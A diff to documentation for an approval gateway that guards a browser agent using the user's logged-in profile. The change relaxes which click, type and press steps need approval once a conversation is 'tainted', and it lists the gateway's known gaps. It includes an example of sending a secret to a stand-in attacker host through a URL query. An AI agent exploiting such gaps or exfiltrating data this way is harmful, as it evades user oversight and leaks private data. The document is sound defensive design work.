@@ -35,9 +35,10 @@ Your logins live in this profile. So a click can send mail as you. The rules fol
 - `open`: free before the conversation is tainted. After that, it is free only for an address that
   can carry nothing out: no query, no `#` part, no long path part. Example: `open
   https://evil.example/?d=<secret>` asks you. `open https://example.com/news` is free.
-- `click`, `type`, `press`: after the conversation is tainted, every one asks you. In practice that
-  is every step after the first page.
-- Before the taint, a step is free unless it really acts. The gateway looks at the live page and
+- `click`, `type`, `press`: a step that does not act runs freely, also after the taint, so a
+  booking asks you once, at the last step. After the taint, typing more than 60 characters asks:
+  a page's script sees what is typed before any submit.
+- A step is free unless it really acts. The gateway looks at the live page and
   judges the element the step would hit, not the agent's words:
   - a form's submit button (also a `<button>` with no type, or a wrapper that holds one) asks;
   - a name with a word like send, submit, pay, buy, order, book, delete, publish, share (Hebrew,
@@ -74,8 +75,8 @@ Your logins live in this profile. So a click can send mail as you. The rules fol
 - WebSockets and WebRTC are not checked (`routeWebSocket` would replace every page's WebSocket
   with Playwright's shim). Chrome's own Local Network Access rules still apply.
 - The CLI browser (`bin/browse.js`, attached over CDP) cannot block service workers.
-- Before the taint, the word list and the submit check are only a best effort. A JavaScript
-  button with an unusual name in an uncovered language may pass. After the taint everything asks.
+- The word list and the submit check are only a best effort. A JavaScript button with an unusual
+  name in an uncovered language may pass, also after the taint.
 - An approved step is not judged again. If the page changes between your yes and the click, the
   click goes to what is there then (the element is pinned at click time, not at approval time).
 - Pages that need a login by a person must be done by you in a visible window.
